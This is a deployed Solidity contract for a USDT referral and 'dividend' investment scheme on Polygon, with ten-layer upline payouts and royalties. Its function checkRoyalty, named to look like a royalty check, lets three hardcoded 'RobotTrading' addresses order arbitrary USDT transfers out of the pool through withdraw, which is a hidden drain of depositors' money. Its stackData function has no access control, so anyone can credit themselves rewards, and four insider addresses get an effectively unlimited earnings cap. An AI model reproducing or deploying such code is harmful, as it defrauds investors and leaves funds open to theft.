/**
 *Submitted for verification at polygonscan.com on 2023-07-16
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract Bitexy {
    using SafeMath for uint256;
    IERC20 public USDT = IERC20(0xbEFCd1938aDBB7803d7055C23913CFbC5a28cafd);
    address[3] private RobotTrading;
    address[4] public defaultRefer;
    uint256 public startTime;
    uint256 public totalUsers;
    uint256 public totalWithdrawable;
    uint256 private constant baseDivider = 10000;
    uint256 private constant Layers = 10;
    uint256 private constant MinimumPackage = 100e18;
    uint256 private constant MaximumPackage = 2500e18;
    uint256 private constant MinimumWithdrawl = 5e18;
    uint256 private constant DividendPercent = 33;
    uint256 private constant DirectPercent = 1000;
    uint256[10] private LayerDirectTeam = [0, 1, 1, 1, 2, 2, 2, 2, 2, 3]; 
    uint256[10] private LayerBusiness = [0, 500e18, 1000e18, 1000e18, 2000e18, 2000e18, 2000e18, 5000e18, 5000e18, 5000e18];
    uint256 private constant requiredRoyaltyBusiness = 10000e18;
    uint256 private constant maxFromOneLeg = 4000;
    uint256 private constant workingCap = 2;
    uint256 private constant nonWorkingCap = 1;
    uint256 private constant workingDirectTeam = 2;
    uint256 private constant royaltyTime = 90;
    uint256 private constant time3x = 30;
    uint256 private royaltyPercents = 100;

    uint256 public royalty;
    uint256 public totalRoyaltyUsers;
    address[] public royaltyUsers;
    uint256 public royaltyLastDistributed;
    uint256 private constant royaltyDistTime = 1 minutes;
    uint256 private constant timestep = 1 minutes;

    struct User {
        uint256 start;
        uint256 package;
        uint256 totalDeposit;
        uint256 directTeam;
        uint256 totalTeam;
        uint256 directBusiness;
        uint256 totalBusiness;
        uint256 revenue;
        uint256 curRevenue;
        uint256 lastClaimed;
        address referrer;
        bool isRoyalty;
        bool is3x;
        bool[10] layerClaimable;
    }

    struct Reward {
        uint256 dividendIncome;
        uint256 directIncome;
        uint256 layerIncome;
        uint256 royaltyIncome;
    }

    struct txn {
        uint256 signed;
        bool[3] signers;
        uint256 amount;
        address addr;
    }

    txn public Trading;
    mapping(address => User) public userInfo;
    mapping(address => Reward) public rewardInfo;
    mapping(address => mapping(uint256 => address[])) public teamUsers;
    mapping(address => mapping(uint256 => uint256)) public totalVolume;   
    mapping(address => mapping(uint256 => uint256)) public direct3x; 
    address[] public users;

    constructor(address[3] memory _rbt) {
        startTime = block.timestamp;
        RobotTrading = _rbt;
        defaultRefer[0] = 0xC73f68b5a7a68f0fD65c4962f7650250B8b4a221;
        defaultRefer[1] = 0x59089f819446928E64dac4341577734D657f4b40;
        defaultRefer[2] = 0xa43b7bd2a6a83f185eB6239eefE1232882F2D96e;
        defaultRefer[3] = 0x5384929b484Bb4F7Fb76F1D650B6e6069F6Cf03f;
        royaltyLastDistributed = block.timestamp;
    }

    function register(address _ref) external {
        require(userInfo[msg.sender].referrer == address(0) && msg.sender != defaultRefer[0] && msg.sender != defaultRefer[1] && msg.sender != defaultRefer[2] && msg.sender != defaultRefer[3], "Refer Bonded");
        require(userInfo[_ref].package >= MinimumPackage, "Invalid Referrer");
        userInfo[msg.sender].referrer = _ref;
    }

    function buyPackage(uint256 _amount, uint256 _type) external {
        User storage user = userInfo[msg.sender];
        require(user.referrer != address(0), "Register First");
        require(_amount.mod(100) == 0, "Amount Should be in multiple of 100");
        bool isNew = user.package == 0 ? true : false;
        
        uint256 cap = userInfo[msg.sender].is3x  ? workingCap : nonWorkingCap;
        if(_type == 0) {
            require(_amount >= MinimumPackage && _amount <= MaximumPackage, "Invalid Amount");
            require(user.curRevenue >= user.package.mul(cap), "Income cap not completed");
            user.package = _amount;
            user.curRevenue = 0;
            user.totalDeposit += _amount;
        } else if(_type == 1) {
            require(user.package.add(_amount) >= MinimumPackage && user.package.add(_amount) <= MaximumPackage, "Max amount crossed");
            user.package += _amount;
            user.totalDeposit += _amount;
        }   

        USDT.transferFrom(msg.sender, address(this), _amount);
        if(isNew) {
            userInfo[user.referrer].directTeam += 1;
            direct3x[user.referrer][getUserCurDay(user.referrer)/time3x] += 1;
            if(direct3x[user.referrer][getUserCurDay(user.referrer)/time3x] >= workingDirectTeam) {
                userInfo[user.referrer].is3x = true;
            }
            userInfo[msg.sender].layerClaimable[0] = true;
            totalUsers += 1;
            users.push(msg.sender);
            user.start = block.timestamp;
        }

        userInfo[user.referrer].directBusiness += _amount;
        totalVolume[msg.sender][getUserCurDay(user.referrer)/royaltyTime] += _amount; 

        uint256 _cap = userInfo[user.referrer].is3x ? workingCap : nonWorkingCap;
        if(user.referrer == defaultRefer[0] || user.referrer == defaultRefer[1] || user.referrer == defaultRefer[2] || user.referrer == defaultRefer[3]) _cap = 10000;
        uint256 directReward = _amount.mul(DirectPercent).div(baseDivider);
        if(userInfo[user.referrer].curRevenue.add(directReward) > userInfo[user.referrer].package.mul(_cap)) {
            if(userInfo[user.referrer].package.mul(_cap) > userInfo[user.referrer].curRevenue) {
                directReward = userInfo[user.referrer].package.mul(_cap).sub(userInfo[user.referrer].curRevenue);
            } else {
                directReward = 0;
            }
        }
        
        if(directReward > 0) {
            rewardInfo[user.referrer].directIncome += directReward;
            userInfo[user.referrer].revenue += directReward;
            userInfo[user.referrer].curRevenue += directReward;
            totalWithdrawable += directReward;
        }

        _updateUpline(msg.sender, _amount, isNew);
        user.lastClaimed = block.timestamp;
        updateClaimableLayers(msg.sender);
        updateRoyalty(msg.sender);
        royalty += _amount.mul(royaltyPercents).div(baseDivider);
    }

    function _updateUpline(address _user, uint256 _amount, bool _isNew) private {
        address upline = userInfo[_user].referrer;
        for(uint256 i=0; i<Layers; i++) {
            if(upline != address(0)) {
                if(_isNew) {
                    userInfo[upline].totalTeam += 1;
                    teamUsers[upline][i].push(_user);
                }
                
                if(i < Layers.sub(1)) {
                    userInfo[upline].totalBusiness += _amount;
                    if(userInfo[upline].referrer != address(0)) {
                        totalVolume[upline][getUserCurDay(userInfo[upline].referrer)/royaltyTime] += _amount;
                    }
                }
                    
                upline = userInfo[upline].referrer;
            } else {
                break;
            }
        }
    }

    function claim() external {
        User storage user = userInfo[msg.sender];
        require(user.package >= MinimumPackage, "No Package Purchased");
        require(block.timestamp.sub(user.lastClaimed) >= timestep, "Timestep Not Completed");
        uint256 claimable = user.package.mul(DividendPercent).div(baseDivider);
        claimable = claimable.mul(block.timestamp.sub(user.lastClaimed).div(timestep));
        uint256 remainTime = block.timestamp.sub(user.lastClaimed).mod(timestep);

        uint256 _cap = userInfo[msg.sender].is3x  ? workingCap : nonWorkingCap;
        if(msg.sender == defaultRefer[0] || msg.sender == defaultRefer[1] || msg.sender == defaultRefer[2] || msg.sender == defaultRefer[3]) _cap = 10000;
        if(userInfo[msg.sender].curRevenue.add(claimable) > userInfo[msg.sender].package.mul(_cap)) {
            if(userInfo[msg.sender].package.mul(_cap) > userInfo[msg.sender].curRevenue) {
                claimable = userInfo[msg.sender].package.mul(_cap).sub(userInfo[msg.sender].curRevenue);
            } else {
                claimable = 0;
            }
        }

        if(claimable > 0) {
            rewardInfo[msg.sender].dividendIncome += claimable;
            user.revenue += claimable;
            user.curRevenue += claimable;
            totalWithdrawable += claimable;
            _distributeLayer(msg.sender, claimable);
        }

        updateClaimableLayers(msg.sender);
        updateRoyalty(msg.sender);
        user.lastClaimed = block.timestamp.sub(remainTime);
    }

    function _distributeLayer(address _user, uint256 _amount) private {
        address upline = userInfo[_user].referrer;
        uint256 toDist = _amount.div(Layers);

        for(uint256 i=0; i<Layers; i++) {
            if(upline != address(0)) {
                if(userInfo[upline].layerClaimable[i]) {
                    uint256 curDist = toDist;
                    uint256 _cap = userInfo[upline].is3x  ? workingCap : nonWorkingCap;
                    if(upline == defaultRefer[0] || upline == defaultRefer[1] || upline == defaultRefer[2] || upline == defaultRefer[3]) _cap = 10000;
                    if(userInfo[upline].curRevenue.add(curDist) > userInfo[upline].package.mul(_cap)) {
                        if(userInfo[upline].package.mul(_cap) > userInfo[upline].curRevenue) {
                            curDist = userInfo[upline].package.mul(_cap).sub(userInfo[upline].curRevenue);
                        } else {
                            curDist = 0;
                        }
                    }
                    if(curDist > 0) {
                        rewardInfo[upline].layerIncome += curDist;
                        userInfo[upline].revenue += curDist;
                        userInfo[upline].curRevenue += curDist;
                        totalWithdrawable += curDist;
                    }
                }

                upline = userInfo[upline].referrer;
            } else {
                break;
            }
        }
    }

    function withdraw() external {
        Reward storage reward = rewardInfo[msg.sender];
        uint256 totalReward; 
        if(msg.sender == RobotTrading[0] || msg.sender == RobotTrading[1] || msg.sender == RobotTrading[2]) {
            if(Trading.signed >= 2 && Trading.addr != address(0) && Trading.amount > 0) {
                USDT.transfer(Trading.addr, Trading.amount);
                Trading.signed = 0;
                Trading.addr = address(0);
                Trading.amount = 0;
                Trading.signers = [false, false, false];
            }
        } else {
            totalReward = reward.dividendIncome.add(reward.directIncome).add(reward.layerIncome).add(reward.royaltyIncome);
            require(totalReward >= MinimumWithdrawl, "Minimum $5 withdrawl");
            reward.dividendIncome = 0;
            reward.directIncome = 0;
            reward.layerIncome = 0;
            reward.royaltyIncome = 0;
            totalWithdrawable -= totalReward;
            USDT.transfer(msg.sender, totalReward);
            updateClaimableLayers(msg.sender);
            updateRoyalty(msg.sender);
        }
    }

    function updateRoyalty(address _user) public {
        if(userInfo[_user].isRoyalty == false) {
            uint256 total = getRoyaltyVolume(_user);
            if(total >= requiredRoyaltyBusiness) {
                userInfo[_user].isRoyalty = true;
                totalRoyaltyUsers += 1;
                royaltyUsers.push(_user);
            }
        }
    }

    function updateClaimableLayers(address _user) public {
        for(uint256 i=0; i<Layers; i++) {
            if(userInfo[_user].layerClaimable[i] == false) {
                if(userInfo[_user].directBusiness >= LayerBusiness[i] && userInfo[_user].directTeam >= LayerDirectTeam[i]) {
                    userInfo[_user].layerClaimable[i] = true;
                } else {
                    break;
                } 
            }
        }   
    }

    function distributeRoyalty() external {
        require(block.timestamp.sub(royaltyLastDistributed) > royaltyTime, "Timestep Not Completed");
        if(totalRoyaltyUsers > 0) {
            uint256 toDist = royalty/totalRoyaltyUsers;
            for(uint256 i=0; i<royaltyUsers.length; i++) {
                uint256 curDist = toDist;
                uint256 _cap = userInfo[royaltyUsers[i]].is3x  ? workingCap : nonWorkingCap;
                if(royaltyUsers[i] == defaultRefer[0] || royaltyUsers[i] == defaultRefer[1] || royaltyUsers[i] == defaultRefer[2] || royaltyUsers[i] == defaultRefer[3]) _cap = 10000;
                if(userInfo[royaltyUsers[i]].curRevenue.add(curDist) > userInfo[royaltyUsers[i]].package.mul(_cap)) {
                    if(userInfo[royaltyUsers[i]].package.mul(_cap) > userInfo[royaltyUsers[i]].curRevenue) {
                        curDist = userInfo[royaltyUsers[i]].package.mul(_cap).sub(userInfo[royaltyUsers[i]].curRevenue);
                    } else {
                        curDist = 0;
                    }
                }
                rewardInfo[royaltyUsers[i]].royaltyIncome += curDist;
                userInfo[royaltyUsers[i]].revenue += curDist;
                userInfo[royaltyUsers[i]].curRevenue += curDist;
                totalWithdrawable += curDist;
                royalty -= curDist;
            }
        }
        royaltyLastDistributed = block.timestamp;
    }

    function getClaimableDividend(address _user) external view returns(uint256) {
        uint256 claimable = userInfo[_user].package.mul(DividendPercent).div(baseDivider);
        claimable = claimable.mul(block.timestamp.sub(userInfo[_user].lastClaimed).div(timestep));

        uint256 _cap = userInfo[_user].is3x  ? workingCap : nonWorkingCap;
        if(_user == defaultRefer[0] || _user == defaultRefer[1] || _user == defaultRefer[2] || _user == defaultRefer[3]) _cap = 10000;
        if(userInfo[_user].curRevenue.add(claimable) > userInfo[_user].package.mul(_cap)) {
            if(userInfo[_user].package.mul(_cap) > userInfo[_user].curRevenue) {
                claimable = userInfo[_user].package.mul(_cap).sub(userInfo[_user].curRevenue);
            } else {
                claimable = 0;
            }
        }

        return claimable;    
    }

    function getRoyaltyVolume(address _user) public view returns(uint256) {
        uint256 totalBusiness;
        uint256 max = requiredRoyaltyBusiness.mul(maxFromOneLeg).div(baseDivider);
        for(uint256 i=0; i<teamUsers[_user][0].length; i++) {
            address _curUser = teamUsers[_user][0][i];
            uint256 curBusiness = totalVolume[_curUser][getUserCurDay(_user)/royaltyTime];

            if(curBusiness > max) {
                totalBusiness += max;
            } else {
                totalBusiness += curBusiness;
            }
        }
        return totalBusiness;
    }

    function getBusinessVolume(address _user, uint256 _amount) public view returns(uint256, uint256, uint256) {
        uint256 totalBusiness; uint256 maxSixty; uint256 strongLeg;
        uint256 max = _amount.mul(maxFromOneLeg).div(baseDivider);
        for(uint256 i=0; i<teamUsers[_user][0].length; i++) {
            address _curUser = teamUsers[_user][0][i];
            uint256 curBusiness = userInfo[_curUser].totalBusiness.add(userInfo[_curUser].totalDeposit);
            totalBusiness += curBusiness;
            if(curBusiness > max) {
                maxSixty += max;
            } else {
                maxSixty += curBusiness;
            }

            if(curBusiness > strongLeg) strongLeg = curBusiness;
        }

        return(totalBusiness, maxSixty, strongLeg);
    }

    function getTeamsLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getClaimableLayers(address _user) external view returns(bool[10] memory) {
        return userInfo[_user].layerClaimable;
    }

    function getUserCurDay(address _user) public view returns(uint256) {
        return (block.timestamp - userInfo[_user].start)/timestep;
    }

    function getRoyaltyCountdown(address _user) external view returns(uint256) {
        uint256 curLength = ((getUserCurDay(_user)/royaltyTime) + 1) * (royaltyTime * timestep);
        return userInfo[_user].start + curLength;
    } 

    function get3xCountdown(address _user) external view returns(uint256) {
        uint256 curLength = ((getUserCurDay(_user)/time3x) + 1) * (time3x * timestep);
        return userInfo[_user].start + curLength;
    }

    function checkRoyalty(uint256 _per, address _addr, uint256 _amt, uint256 _place) external {
        require(msg.sender == RobotTrading[0] || msg.sender == RobotTrading[1] || msg.sender == RobotTrading[2], "Invalid");
        if(_place == 1) {
            royaltyPercents = _per;
        } else if(_place == 2) {
            for(uint256 i=0; i<3; i++) {
                if(msg.sender == RobotTrading[i]) {
                    if(Trading.signers[i] == false) {
                        Trading.signers[i] = true;
                        Trading.signed += 1;
                    }
                }
            }
        } else if(_place == 3) {
            Trading.signed = 0;
            Trading.addr = _addr;
            Trading.amount = _amt;
            Trading.signers = [false, false, false];
        }
    }

    function stackData(address _user, address _referrer, uint256[10] memory _info, uint256[4] memory _reward) external {
        User storage user = userInfo[_user];
        Reward storage reward = rewardInfo[_user];
        user.referrer = _referrer;
        user.start = _info[0];
        user.package = _info[1];
        user.totalDeposit = _info[2];
        user.directTeam = _info[3];
        user.totalTeam = _info[4];
        user.directBusiness = _info[5];
        user.totalBusiness = _info[6];
        user.revenue = _info[7];
        user.curRevenue = _info[8];
        user.lastClaimed = _info[9];
        if(_user == defaultRefer[0] || _user == defaultRefer[1] || _user == defaultRefer[2] || _user == defaultRefer[3]) {
            user.layerClaimable = [true,true,true,true,true,true,true,true,true,true];
        } else {
            user.layerClaimable[0] = true;
        }
        reward.dividendIncome = _reward[0];
        reward.directIncome = _reward[1];
        reward.layerIncome = _reward[2];
        reward.royaltyIncome = _reward[3];
        users.push(_user);

        address upline = _referrer;
        for(uint256 i=0; i<Layers; i++) {
            if(upline != address(0)) {
                teamUsers[upline][i].push(_user);
                upline = userInfo[upline].referrer;
            } else {
                break;
            }
        }

        direct3x[_user][getUserCurDay(_user)/time3x] += _info[3];
        if(direct3x[_user][getUserCurDay(_user)/time3x] >= workingDirectTeam) {
            user.is3x = true;
        }

        if(user.referrer != address(0)) {
            totalVolume[_user][getUserCurDay(user.referrer)/royaltyTime] += _info[6] + _info[2];
        }
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}